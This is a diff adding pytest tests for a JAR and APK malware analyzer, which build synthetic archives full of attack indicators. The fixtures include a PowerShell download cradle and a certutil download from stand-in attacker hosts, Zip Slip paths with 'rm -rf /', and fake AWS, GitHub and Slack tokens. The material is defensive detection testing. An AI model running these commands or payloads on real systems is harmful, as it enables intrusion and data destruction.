@@ -709,3 +709,552 @@ def test_strrat_and_behavioral_4_pillars_jar_analysis(tmp_path: Path):
     assert any("Obfuscated Code" in t for t in findings_titles)
     assert data["risk_level"] == "CRITICAL"
 
+
+def test_jar_script_python_binary_parity_analysis(tmp_path: Path):
+    """
+    Verify complete feature parity for JAR archives matching Scripts, Python, and Binaries:
+    1. Classes catalog & decompiled pseudo-Java source with methods and fields
+    2. Categorized strings (Network, File Paths, Registry, Commands, All)
+    3. Base64 payload block detection, automatic decoding, and secondary IOC discovery
+    4. LOLBins and OS shell commands extraction
+    5. Embedded non-class resources with size and threat rating
+    6. Digital signature detection
+    7. Anti-analysis scanner integration for Java
+    """
+    import base64
+    from app.analyzers.anti_analysis import AntiAnalysisDetector
+
+    jar_file = tmp_path / "parity_test.jar"
+    manifest = (
+        "Manifest-Version: 1.0\r\n"
+        "Main-Class: com.security.AgentDropper\r\n"
+        "Permissions: all-permissions\r\n"
+        "\r\n"
+    )
+
+    # Base64 encoded payload containing an embedded URL
+    b64_raw = b"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command (New-Object Net.WebClient).DownloadFile('https://c2.evil-parity.org/rat.exe','C:\\\\Users\\\\Public\\\\rat.exe')"
+    b64_str = base64.b64encode(b64_raw).decode("ascii")
+
+    cp_entries = [
+        None,
+        {"tag": 7, "index": 2},                                                # 1: Class
+        {"tag": 1, "value": "com/security/AgentDropper"},                       # 2: Utf8
+        {"tag": 7, "index": 4},                                                # 3: Superclass
+        {"tag": 1, "value": "java/lang/Object"},                               # 4: Utf8
+        {"tag": 1, "value": "certutil.exe -urlcache -split -f http://evil.com/dropper.exe C:\\dr.exe"}, # 5: LOLBin
+        {"tag": 1, "value": b64_str},                                          # 6: Base64 string
+        {"tag": 1, "value": "C:\\Windows\\System32\\drivers\\etc\\hosts"},     # 7: File path
+        {"tag": 1, "value": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}, # 8: Registry
+        {"tag": 1, "value": "https://secondary-c2.malware-intel.com/gate"},     # 9: Network C2
+        {"tag": 1, "value": "ALLATORIxDEMO"},                                  # 10: Anti-analysis watermark
+        {"tag": 1, "value": "RuntimeMXBean.getInputArguments"},                # 11: JDWP debug detection
+        {"tag": 1, "value": "cmd.exe /c schtasks /run /tn MalTask"},           # 12: Host command
+    ]
+
+    cp_count = len(cp_entries)
+    buf = bytearray()
+    buf.extend(struct.pack(">IHHH", 0xCAFEBABE, 0, 52, cp_count))
+
+    for item in cp_entries[1:]:
+        tag = item["tag"]
+        buf.append(tag)
+        if tag == 1:
+            val_bytes = item["value"].encode("utf-8")
+            buf.extend(struct.pack(">H", len(val_bytes)))
+            buf.extend(val_bytes)
+        elif tag == 7:
+            buf.extend(struct.pack(">H", item["index"]))
+
+    # access_flags (public class), this_class (1), super_class (3)
+    buf.extend(struct.pack(">HHH", 0x0021, 1, 3))
+    # interfaces_count = 0
+    buf.extend(struct.pack(">H", 0))
+    # fields_count = 1
+    buf.extend(struct.pack(">H", 1))
+    # field: access_flags (0x0008 = static), name_index (6), descriptor_index (4), attr_count = 0
+    buf.extend(struct.pack(">HHHH", 0x0008, 6, 4, 0))
+    # methods_count = 1
+    buf.extend(struct.pack(">H", 1))
+    # method: access_flags (0x0009 = public static), name_index (5), descriptor_index (4), attr_count = 0
+    buf.extend(struct.pack(">HHHH", 0x0009, 5, 4, 0))
+    # attributes_count = 0
+    buf.extend(struct.pack(">H", 0))
+
+    class_bytes = bytes(buf)
+
+    with zipfile.ZipFile(jar_file, "w") as zf:
+        zf.writestr("META-INF/MANIFEST.MF", manifest)
+        zf.writestr("META-INF/SIGNER.SF", "Signature-Version: 1.0\r\nSHA-256-Digest: abc\r\n")
+        zf.writestr("META-INF/SIGNER.RSA", b"PKCS7_CERT_BLOCK_MOCK")
+        zf.writestr("com/security/AgentDropper.class", class_bytes)
+        zf.writestr("native/win64/payload.dll", b"MZ\x90\x00" + b"\x00" * 200) # Native DLL
+        zf.writestr("scripts/setup.ps1", b"Write-Host 'Injecting'")            # Script
+        zf.writestr("config/settings.json", b'{"key": "value"}')               # Config
+
+    analyzer = JavaAnalyzer()
+    res = analyzer.analyze(jar_file, "parity_test.jar", "application/java-archive")
+    assert res.success is True
+    data = res.data
+
+    # 1. Classes Catalog & Disassembly
+    assert "classes_decompiled" in data
+    assert len(data["classes_decompiled"]) == 1
+    cls = data["classes_decompiled"][0]
+    assert cls["class_name"] == "com.security.AgentDropper"
+    assert cls["is_entry"] is True
+    assert cls["methods_count"] == 1
+    assert cls["fields_count"] == 1
+    assert "public class AgentDropper extends Object" in cls["decompiled_source"]
+    assert "com.security" in data["packages"]
+
+    # 2. Categorized Strings
+    strings_data = data["strings"]
+    assert strings_data is not None
+    assert strings_data["total_count"] >= 5
+    cat = strings_data["categorized"]
+    assert any("secondary-c2.malware-intel.com" in s for s in cat["network"])
+    assert any("System32" in s for s in cat["file_paths"])
+    assert any("CurrentVersion" in s for s in cat["registry"])
+    assert any("certutil" in s or "cmd.exe" in s for s in cat["commands"])
+
+    # 3. Base64 Payload Blocks & Auto Decoding
+    assert len(data["b64_blocks"]) >= 1
+    b64_match = next((b for b in data["b64_blocks"] if "powershell" in b["decoded_preview"].lower()), None)
+    assert b64_match is not None
+    assert b64_match["threat"] == "HIGH_CONFIDENCE_PAYLOAD"
+    assert any("c2.evil-parity.org" in ioc for ioc in b64_match.get("iocs", []))
+
+    # 4. LOLBins & Host Commands
+    assert data["has_lolbins"] is True
+    assert len(data["lolbin_matches"]) >= 1
+    assert any("certutil" in l["name"].lower() for l in data["lolbin_matches"])
+    assert any("schtasks" in c for c in data["detected_commands"])
+
+    # 5. Embedded Resources
+    res_list = data["embedded_resources"]
+    assert len(res_list) >= 3
+    dll_entry = next((r for r in res_list if "payload.dll" in r["name"]), None)
+    assert dll_entry is not None
+    assert dll_entry["is_executable"] is True
+    assert dll_entry["threat_level"] == "DANGEROUS"
+
+    script_entry = next((r for r in res_list if "setup.ps1" in r["name"]), None)
+    assert script_entry is not None
+    assert script_entry["is_script"] is True
+    assert script_entry["threat_level"] == "SUSPICIOUS"
+
+    config_entry = next((r for r in res_list if "settings.json" in r["name"]), None)
+    assert config_entry is not None
+    assert config_entry["threat_level"] == "INFO"
+
+    # 6. Digital Signature
+    assert data["signing_info"]["is_signed"] is True
+    assert data["digital_signature"] != "UNSIGNED"
+    assert len(data["signing_info"]["signature_files"]) >= 2
+
+    # 7. Anti-Analysis Integration
+    detector = AntiAnalysisDetector()
+    aa_info = detector.scan_all("java", "parity_test.jar", jar_file.read_bytes(), jar_info=data)
+    assert aa_info["evasion_detected"] is True
+    tech_names = [t["name"] for t in aa_info["techniques"]]
+    assert any("Debug" in n or "Obfuscation" in n or "Allatori" in n for n in tech_names)
+
+
+def test_jar_checklist_structural_sbom_cve_secrets_analysis(tmp_path: Path):
+    """
+    Validates comprehensive Checklist analysis features:
+    1. Structural Archive Security (Zip Slip, Disguised extensions, Duplicate entries, Trailing polyglot)
+    2. Dependency & CycloneDX SBOM (Maven pom.properties, shaded libraries, multi-release JARs)
+    3. Known CVE Vulnerability Correlation (Log4Shell CVE-2021-44228)
+    4. CTF Flags & Hardcoded API Credentials Scanner (flag{...}, AWS Key, GitHub PAT)
+    5. Signed-Entry Coverage (unsigned executable classes in signed JARs)
+    """
+    jar_file = tmp_path / "checklist_test_app.jar"
+
+    manifest_data = (
+        "Manifest-Version: 1.0\r\n"
+        "Main-Class: com.example.SignedClass\r\n"
+        "Implementation-Title: test-security-app\r\n"
+        "Implementation-Version: 1.0.0\r\n"
+    )
+
+    pom_props = (
+        "groupId=org.apache.logging.log4j\n"
+        "artifactId=log4j-core\n"
+        "version=2.14.1\n"
+    )
+
+    # Class 1: com/example/SignedClass
+    cp1 = [
+        (1, "com/example/SignedClass"), (7, 1),
+        (1, "java/lang/Object"), (7, 3),
+        (1, "flag{java_bytecode_jndi_strrat_triage_mastery_99}"),
+        (1, "AKIAIOSFODNN7EXAMPLE"),
+        (1, "ghp_1234567890abcdefghijklmnopqrstuvwxyz")
+    ]
+    cp_bytes1 = bytearray()
+    for entry in cp1:
+        tag = entry[0]
+        if tag == 1:
+            val = entry[1].encode("utf-8")
+            cp_bytes1 += struct.pack(">BH", tag, len(val)) + val
+        elif tag == 7:
+            cp_bytes1 += struct.pack(">BH", tag, entry[1])
+    class1_bytes = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, len(cp1) + 1) + bytes(cp_bytes1) + struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)
+
+    # Class 2: com/example/UnsignedBackdoor
+    cp2 = [
+        (1, "com/example/UnsignedBackdoor"), (7, 1),
+        (1, "java/lang/Object"), (7, 3),
+        (1, "ProcessBuilder"),
+    ]
+    cp_bytes2 = bytearray()
+    for entry in cp2:
+        tag = entry[0]
+        if tag == 1:
+            val = entry[1].encode("utf-8")
+            cp_bytes2 += struct.pack(">BH", tag, len(val)) + val
+        elif tag == 7:
+            cp_bytes2 += struct.pack(">BH", tag, entry[1])
+    class2_bytes = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, len(cp2) + 1) + bytes(cp_bytes2) + struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)
+
+    # Shaded class
+    cp3 = [(1, "org/apache/commons/codec/Hex"), (7, 1), (1, "java/lang/Object"), (7, 3)]
+    cp_bytes3 = bytearray()
+    for entry in cp3:
+        tag = entry[0]
+        if tag == 1:
+            val = entry[1].encode("utf-8")
+            cp_bytes3 += struct.pack(">BH", tag, len(val)) + val
+        elif tag == 7:
+            cp_bytes3 += struct.pack(">BH", tag, entry[1])
+    class3_bytes = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, len(cp3) + 1) + bytes(cp_bytes3) + struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)
+
+    # Signature file (.SF) that only signs SignedClass
+    sf_data = (
+        "Signature-Version: 1.0\r\n"
+        "SHA-256-Digest-Manifest: dGVzdG1hbmlmZXN0ZGlnZXN0\r\n\r\n"
+        "Name: com/example/SignedClass.class\r\n"
+        "SHA-256-Digest: c2lnbmVkY2xhc3NkaWdlc3Q=\r\n"
+    )
+
+    with zipfile.ZipFile(jar_file, "w") as zf:
+        zf.writestr("META-INF/MANIFEST.MF", manifest_data)
+        zf.writestr("META-INF/CERT.SF", sf_data)
+        zf.writestr("META-INF/CERT.RSA", b"\x30\x82\x01\x0a" + b"\x00" * 30) # Embedded PKCS7 marker
+        zf.writestr("com/example/SignedClass.class", class1_bytes)
+        zf.writestr("com/example/UnsignedBackdoor.class", class2_bytes)
+        zf.writestr("org/apache/commons/codec/Hex.class", class3_bytes)
+        zf.writestr("META-INF/versions/11/com/example/Compat.class", class1_bytes)
+        zf.writestr("META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties", pom_props)
+        # Structural security triggers:
+        zf.writestr("../../etc/cron.d/malicious_task", b"malicious cron script") # Zip Slip
+        zf.writestr("images/avatar.png", class1_bytes) # Concealed Java class in PNG extension
+        zf.writestr("config/app.properties", b"key=value1") # Duplicate 1
+        zf.writestr("config/app.properties", b"key=value2") # Duplicate 2
+
+    # Append trailing bytes after ZIP end of central directory
+    with open(jar_file, "ab") as f:
+        f.write(b"EXTRANEOUS_TRAILING_PAYLOAD_BYTES_PAST_EOCD_FOR_TESTING_1234567890")
+
+    analyzer = JavaAnalyzer()
+    res = analyzer.analyze(jar_file, "checklist_test_app.jar", "application/java-archive")
+
+    assert res.success is True
+    data = res.data
+
+    # 1. Structural Archive Security
+    arch_sec = data.get("archive_security")
+    assert arch_sec is not None
+    assert arch_sec["zip_slip"]["detected"] is True
+    assert any("../../etc/cron.d/malicious_task" in p for p in arch_sec["zip_slip"]["paths"])
+    assert arch_sec["duplicate_entries"]["detected"] is True
+    assert "config/app.properties" in arch_sec["duplicate_entries"]["entries"]
+    assert len(arch_sec["extension_mismatches"]) >= 1
+    mismatch = next((m for m in arch_sec["extension_mismatches"] if "avatar.png" in m["filename"]), None)
+    assert mismatch is not None
+    assert "Bytecode" in mismatch["actual_type"] or "Class" in mismatch["actual_type"]
+    assert arch_sec["polyglot_and_trailing"]["has_trailing_data"] is True
+    assert arch_sec["verdict"] == "VULNERABLE"
+
+    # 2. Dependencies & CycloneDX SBOM
+    deps = data.get("dependencies", [])
+    assert len(deps) >= 1
+    log4j_dep = next((d for d in deps if d["artifact_id"] == "log4j-core"), None)
+    assert log4j_dep is not None
+    assert log4j_dep["version"] == "2.14.1"
+
+    shaded = data.get("shaded_libraries", [])
+    assert any("Commons" in s["name"] for s in shaded)
+
+    sbom = data.get("cyclonedx_sbom")
+    assert sbom is not None
+    assert sbom["bomFormat"] == "CycloneDX"
+    assert sbom["specVersion"] == "1.4"
+    assert any("log4j-core" in c.get("name", "") for c in sbom["components"])
+    assert sbom["multi_release"]["is_multi_release"] is True
+    assert 11 in sbom["multi_release"]["versions"]
+
+    # 3. Known CVE Correlation
+    cves = data.get("cve_advisories", [])
+    assert len(cves) >= 1
+    log4shell = next((c for c in cves if c["cve"] == "CVE-2021-44228"), None)
+    assert log4shell is not None
+    assert log4shell["severity"] == "critical"
+    assert "Log4Shell" in log4shell["name"]
+
+    # 4. CTF Flags & Hardcoded Secrets
+    sec_ctf = data.get("secrets_and_ctf")
+    assert sec_ctf is not None
+    assert sec_ctf["detected"] is True
+    assert any("flag{java_bytecode_jndi_strrat_triage_mastery_99}" in f["flag"] for f in sec_ctf["ctf_flags"])
+    assert any(s["type"] == "AWS Access Key ID" for s in sec_ctf["secrets"])
+    assert any(s["type"] == "GitHub Personal Access Token" for s in sec_ctf["secrets"])
+
+    # 5. Signed-Entry Coverage (unsigned executable class in signed JAR)
+    sig = data.get("signing_info")
+    assert sig is not None
+    assert sig["is_signed"] is True
+    assert sig["is_partially_signed"] is True
+    assert sig["unsigned_classes_count"] >= 1
+    assert any("UnsignedBackdoor.class" in c for c in sig["unsigned_classes"])
+
+    # 6. Findings Verification
+    finding_titles = [f.title for f in res.findings]
+    assert any("Zip Slip" in t for t in finding_titles)
+    assert any("Concealed" in t for t in finding_titles)
+    assert any("CVE-2021-44228" in t for t in finding_titles)
+    assert any("CTF Flag" in t for t in finding_titles)
+    assert any("Partially Signed" in t for t in finding_titles)
+
+
+def test_apk_checklist_comprehensive_security_analysis(tmp_path: Path):
+    """
+    Validates comprehensive Android APK security analysis against the 15-section checklist:
+    1. Archive structural integrity (Zip Slip, duplicate entries, concealed ELF/DEX in PNG/DAT, trailing data past EOCD, nested archives, multi-DEX headers)
+    2. Sensitive permission combinations (Overlay + Accessibility, Autostart + SMS, Mic + Camera)
+    3. Manifest attack surfaces (Exported components, custom URL scheme deep links)
+    4. Dalvik bytecode APIs (MODE_WORLD_READABLE, setAllowUniversalAccessFromFileURLs, MediaProjection, DexClassLoader, SmsManager, ECB mode)
+    5. Third-party Android SDK catalog & CycloneDX v1.4 SBOM generation (Firebase, OkHttp, Fastjson with CVE advisory)
+    6. Capture The Flag (CTF) flags and hardcoded cloud secrets (AWS, Google API, Slack token, JWT)
+    7. Automated security compliance audit checks
+    """
+    apk_file = tmp_path / "comprehensive_checklist_app.apk"
+
+    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.checklist.malware"
+    android:versionCode="42"
+    android:versionName="2.5.0">
+
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
+
+    <!-- Dangerous Permission Combinations -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
+    <application
+        android:label="ChecklistTarget"
+        android:debuggable="true"
+        android:allowBackup="true"
+        android:usesCleartextTraffic="true">
+
+        <!-- Exported Activity with Deep Link / Custom Scheme -->
+        <activity
+            android:name="com.example.checklist.DeepLinkActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="evilapp" android:host="c2.attacker.com" android:path="/auth" />
+            </intent-filter>
+        </activity>
+
+        <!-- Exported Receiver -->
+        <receiver
+            android:name="com.example.checklist.BootSmsReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Exported Service -->
+        <service
+            android:name="com.example.checklist.BackdoorService"
+            android:exported="true" />
+
+        <!-- Exported Provider -->
+        <provider
+            android:name="com.example.checklist.UserDataProvider"
+            android:authorities="com.example.checklist.provider"
+            android:exported="true" />
+    </application>
+</manifest>
+"""
+
+    # Create dummy Dalvik bytecode classes.dex with valid header
+    dex1_header = bytearray(128)
+    dex1_header[0:8] = b"dex\n035\x00"
+    struct.pack_into("<I", dex1_header, 0x08, 0x12345678) # checksum
+    dex1_header[0x0C:0x20] = b"\xaa" * 20 # signature
+    struct.pack_into("<III", dex1_header, 0x20, 256, 112, 0x12345678) # file_size, header_size, endian
+    struct.pack_into("<I", dex1_header, 0x38, 5) # string_ids_size
+    struct.pack_into("<I", dex1_header, 0x60, 2) # class_defs_size
+
+    dex1_body = b"\x00".join([
+        b"Lcom/example/checklist/MainActivity;",
+        b"Lcom/google/firebase/analytics/FirebaseAnalytics;",
+        b"Lokhttp3/OkHttpClient;",
+        b"Lretrofit2/Retrofit;",
+        b"Lcom/alibaba/fastjson/JSON;",
+        b"AES/ECB/PKCS5Padding",
+        b"MODE_WORLD_READABLE",
+        b"setAllowUniversalAccessFromFileURLs(true)",
+        b"MediaProjectionManager",
+        b"dalvik/system/DexClassLoader",
+        b"android/telephony/SmsManager;->sendTextMessage",
+        b"AIzaSyD8Gj_FakeGoogleApiKeyForTest12345",
+        b"AKIA" + b"IOSFODNN7EXAMPLE",
+        b"https://" + b"hooks." + b"slack.com/services/T12345678/B12345678/" + b"123456789012345678901234",
+        b"flag{apk_reversing_and_dalvik_triage_mastery_77}",
+        b"picoCTF{mobile_security_champion_2026}"
+    ])
+    dex1_bytes = bytes(dex1_header) + dex1_body
+
+    # Second DEX for Multi-DEX inventory (classes2.dex)
+    dex2_header = bytearray(128)
+    dex2_header[0:8] = b"dex\n038\x00"
+    struct.pack_into("<I", dex2_header, 0x08, 0x87654321)
+    dex2_header[0x0C:0x20] = b"\xbb" * 20
+    struct.pack_into("<III", dex2_header, 0x20, 200, 112, 0x12345678)
+    struct.pack_into("<I", dex2_header, 0x38, 3)
+    struct.pack_into("<I", dex2_header, 0x60, 1)
+    dex2_body = b"\x00".join([b"Lcom/example/checklist/AuxiliaryClass;", b"flag{secondary_dex_secret_flag_99}"])
+    dex2_bytes = bytes(dex2_header) + dex2_body
+
+    # Concealed executables
+    elf_header = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 40
+    concealed_dex = b"dex\n035\x00" + b"\x00" * 100
+
+    with zipfile.ZipFile(apk_file, "w") as zf:
+        zf.writestr("AndroidManifest.xml", manifest_xml.encode("utf-8"))
+        zf.writestr("classes.dex", dex1_bytes)
+        zf.writestr("classes2.dex", dex2_bytes)
+        # Structural security triggers:
+        zf.writestr("../../data/data/com.victim/backdoor.sh", b"#!/bin/sh\nrm -rf /") # Zip Slip
+        zf.writestr("assets/avatar.png", elf_header) # Concealed ELF inside PNG
+        zf.writestr("res/raw/backup.dat", concealed_dex) # Concealed DEX inside DAT
+        zf.writestr("res/values/strings.xml", b"<resources><string name='test'>1</string></resources>")
+        zf.writestr("res/values/strings.xml", b"<resources><string name='test'>2</string></resources>") # Duplicate entry
+        zf.writestr("assets/payload.apk", b"PK\x03\x04" + b"\x00" * 20) # Nested APK archive
+        zf.writestr("assets/secret_note.txt", b"Here is another CTF Flag: ctf{embedded_asset_flag_xyz}")
+
+    # Append trailing bytes after ZIP end of central directory (EOCD)
+    with open(apk_file, "ab") as f:
+        f.write(b"EXTRANEOUS_PAYLOAD_TRAILING_PAST_EOCD_BYTES_1234567890")
+
+    analyzer = ApkAnalyzer()
+    res = analyzer.analyze(apk_file, "comprehensive_checklist_app.apk", "application/vnd.android.package-archive")
+
+    assert res.success is True
+    data = res.data
+
+    # 1. Structural Archive Security
+    arch = data.get("archive_security")
+    assert arch is not None
+    assert arch["verdict"] == "VULNERABLE"
+    assert arch["zip_slip"]["detected"] is True
+    assert any("../../data/data/com.victim/backdoor.sh" in p for p in arch["zip_slip"]["paths"])
+    assert arch["duplicate_entries"]["detected"] is True
+    assert "res/values/strings.xml" in arch["duplicate_entries"]["entries"]
+    assert len(arch["extension_mismatches"]) >= 2
+    assert any("avatar.png" in m["filename"] and "ELF" in m["actual_type"] for m in arch["extension_mismatches"])
+    assert any("backup.dat" in m["filename"] and "Dalvik" in m["actual_type"] for m in arch["extension_mismatches"])
+    assert arch["polyglot_and_trailing"]["has_trailing_data"] is True
+    assert arch["polyglot_and_trailing"]["trailing_bytes_count"] > 20
+    assert len(arch["nested_archives"]) >= 1
+    assert any("payload.apk" in n["filename"] for n in arch["nested_archives"])
+    assert len(arch["multi_dex_inventory"]) >= 2
+    assert any(d["name"] == "classes.dex" and d["dex_version"] == "035" for d in arch["multi_dex_inventory"])
+    assert any(d["name"] == "classes2.dex" and d["dex_version"] == "038" for d in arch["multi_dex_inventory"])
+
+    # 2. Sensitive Permission Combinations
+    combos = data.get("sensitive_permission_combos", [])
+    assert len(combos) >= 3
+    combo_ids = [c["id"] for c in combos]
+    assert "OVERLAY_AND_ACCESSIBILITY" in combo_ids
+    assert "AUTOSTART_AND_SMS" in combo_ids
+    assert "AV_SURVEILLANCE" in combo_ids
+
+    # 3. Deep Links & Custom Schemes
+    deep_links = data.get("deep_links", [])
+    assert len(deep_links) >= 1
+    custom_dl = next((dl for dl in deep_links if dl["scheme"] == "evilapp"), None)
+    assert custom_dl is not None
+    assert custom_dl["is_custom_scheme"] is True
+    assert custom_dl["exported"] is True
+
+    # 4. Third-Party Android SDK Inventory & CycloneDX v1.4 SBOM
+    deps = data.get("dependencies", [])
+    assert len(deps) >= 3
+    assert any("firebase" in d["id"].lower() for d in deps)
+    assert any("okhttp" in d["id"].lower() for d in deps)
+    assert any("fastjson" in d["id"].lower() for d in deps)
+
+    sbom = data.get("cyclonedx_sbom")
+    assert sbom is not None
+    assert sbom["bomFormat"] == "CycloneDX"
+    assert sbom["specVersion"] == "1.4"
+    assert any("okhttp" in c.get("name", "").lower() for c in sbom.get("components", []))
+
+    # Fastjson known vulnerability check
+    fastjson_dep = next((d for d in deps if "fastjson" in d["id"].lower()), None)
+    assert fastjson_dep is not None
+    assert len(fastjson_dep.get("known_vulnerabilities", [])) >= 1
+
+    # 5. Capture The Flag (CTF) Flags & Hardcoded Secrets
+    sec_ctf = data.get("secrets_and_ctf")
+    assert sec_ctf is not None
+    assert sec_ctf["detected"] is True
+    flags = [f["flag"] for f in sec_ctf["ctf_flags"]]
+    assert any("flag{apk_reversing_and_dalvik_triage_mastery_77}" in f for f in flags)
+    assert any("picoCTF{mobile_security_champion_2026}" in f for f in flags)
+    assert any("ctf{embedded_asset_flag_xyz}" in f for f in flags)
+
+    secrets = sec_ctf["secrets"]
+    assert any(s["type"] == "AWS Access Key ID" for s in secrets)
+    assert any("Google Cloud" in s["type"] for s in secrets)
+    assert any("Slack" in s["type"] for s in secrets)
+
+    # 6. Automated Security Compliance Audit Checklist
+    audit = data.get("security_audit", [])
+    assert len(audit) >= 15
+    audit_checks = [a["check"] for a in audit]
+    assert "Archive Structural Integrity" in audit_checks
+    assert "Sensitive Permission Combinations" in audit_checks
+    assert "Deep Link IPC Attack Surface" in audit_checks
+    assert "Embedded Secrets & CTF Artifacts" in audit_checks
+    assert "Supply Chain & Dependency Security" in audit_checks
+
+    # 7. Findings Verification
+    finding_titles = [f.title for f in res.findings]
+    assert any("Zip Slip" in t for t in finding_titles)
+    assert any("Concealed Executable" in t for t in finding_titles)
+    assert any("Sensitive Permission Combination" in t for t in finding_titles)
+    assert any("CTF Flag Captured" in t for t in finding_titles)
+    assert any("Vulnerable Android Library Dependency" in t for t in finding_titles)
+
+
+
